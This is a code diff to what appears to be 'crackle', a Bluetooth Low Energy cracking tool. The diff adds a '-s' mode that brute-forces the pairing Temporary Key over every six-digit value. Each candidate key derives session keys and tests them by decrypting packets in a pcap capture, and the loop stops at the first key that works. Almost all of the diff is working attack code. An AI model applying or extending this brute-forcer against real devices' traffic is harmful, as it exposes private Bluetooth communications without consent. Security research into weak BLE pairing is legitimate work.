@@ -589,6 +589,7 @@ int main(int argc, char **argv) {
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *cap;
     crackle_state_t state;
+    crackle_state_t dup_state;
     int err_count = 0;
     uint8_t confirm_mrand[16] = { 0, };
     uint8_t confirm_srand[16] = { 0, };
@@ -599,14 +600,14 @@ int main(int argc, char **argv) {
     // arguments
     int opt;
     int verbose = 0, do_tests = 0;
-    int do_tk_crack = 1, do_ltk_decrypt = 0;
+    int do_tk_crack = 1, do_stk_crack = 0, do_ltk_decrypt = 0;
     int do_reverse = 0;
     char *pcap_file = NULL;
     char *pcap_file_out = NULL;
     char *ltk = NULL;
     uint8_t ltk_bytes[16];
 
-    while ((opt = getopt(argc, argv, "i:o:vthl:r")) != -1) {
+    while ((opt = getopt(argc, argv, "i:o:svthl:r")) != -1) {
         switch (opt) {
             case 'i':
                 pcap_file = strdup(optarg);
@@ -622,6 +623,11 @@ int main(int argc, char **argv) {
 
             case 't':
                 do_tests = 1;
+                break;
+
+            case 's':
+                do_tk_crack = 0;
+                do_stk_crack = 1;
                 break;
 
             case 'l':
@@ -719,12 +725,14 @@ int main(int argc, char **argv) {
             printf("No confirm values found, at least one is needed\n");
             ++err_count;
         }
+    }
+    if (do_tk_crack || do_stk_crack) {
         if (state.random_found != 2) {
             printf("Not enough random values found (%d, need 2)\n", state.random_found);
             ++err_count;
         }
     }
-    if (do_tk_crack || do_ltk_decrypt) {
+    if (do_tk_crack || do_stk_crack || do_ltk_decrypt) {
         if (!state.enc_req_found) {
             printf("No LL_ENC_REQ found\n");
             ++err_count;
@@ -783,10 +791,63 @@ int main(int argc, char **argv) {
         calc_stk(&state, numeric_key);
     }
 
+    calc_iv(&state);
+
+    if (do_stk_crack) {
+        for (numeric_key = -5; numeric_key <= 999999; numeric_key++) {
+            printf("\n\n\n\nTrying TK: %d\n", numeric_key);
+            memcpy(&dup_state, &state, sizeof(crackle_state_t));
+            calc_stk(&dup_state, numeric_key);
+
+            // at this point we either have the STK from TK cracking or LTK from
+            // command line args
+            calc_session_key(&dup_state);
+
+            pcap_t *pcap_dumpfile = pcap_open_dead(DLT_PPI, 128);
+            if (pcap_dumpfile == NULL)
+                err(1, "pcap_open_dead: ");
+            dup_state.dumper = pcap_dump_open(pcap_dumpfile, "/dev/null");
+            if (dup_state.dumper == NULL) {
+                warn("pcap_dump_open");
+                pcap_close(pcap_dumpfile);
+                return 1;
+            }
+
+            dup_state.btle_handler = packet_decrypter;
+
+            cap = pcap_open_offline(pcap_file, errbuf);
+            if (cap == NULL)
+                errx(1, "%s", errbuf);
+            pcap_dispatch(cap, 0, packet_handler, (u_char *)&dup_state);
+            pcap_close(cap);
+
+            pcap_dump_flush(dup_state.dumper);
+            pcap_close(pcap_dumpfile);
+
+            if (dup_state.total_decrypted > 0) {
+                tk_found = 1;
+                break;
+            }
+        }
+
+        if (!tk_found) {
+            printf("TK not found, the connection is probably using OOB pairing\n");
+            printf("Sorry d00d :(\n");
+            return 1;
+        }
+
+        printf("\n\n!!!\n");
+        printf("TK found: %06d\n", numeric_key);
+        if (numeric_key == 0)
+            printf("ding ding ding, using a TK of 0! Just Cracks(tm)\n");
+        printf("!!!\n\n");
+
+        calc_stk(&state, numeric_key);
+    }
+
     // at this point we either have the STK from TK cracking or LTK from
     // command line args
     calc_session_key(&state);
-    calc_iv(&state);
 
     if (verbose) {
         printf("STK:");
